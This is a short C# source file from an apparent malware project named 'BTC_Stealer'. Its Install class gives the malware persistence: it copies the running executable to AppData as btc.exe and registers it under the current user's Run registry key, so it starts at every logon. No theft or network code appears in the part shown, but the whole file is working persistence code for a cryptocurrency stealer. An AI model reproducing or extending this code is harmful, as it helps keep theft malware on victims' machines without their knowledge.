using Microsoft.Win32;
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace BTC_Stealer
{
    class Install
    {
        string file = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string name = "btcsteler";

        public void IsStartup()
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rkApp.GetValue(name) == null)
            {
                File.Copy(file, appdata + "\\btc.exe");
                rkApp.SetValue(name, appdata + "\\btc.exe");
            }
            else  return;
        }
    }
}
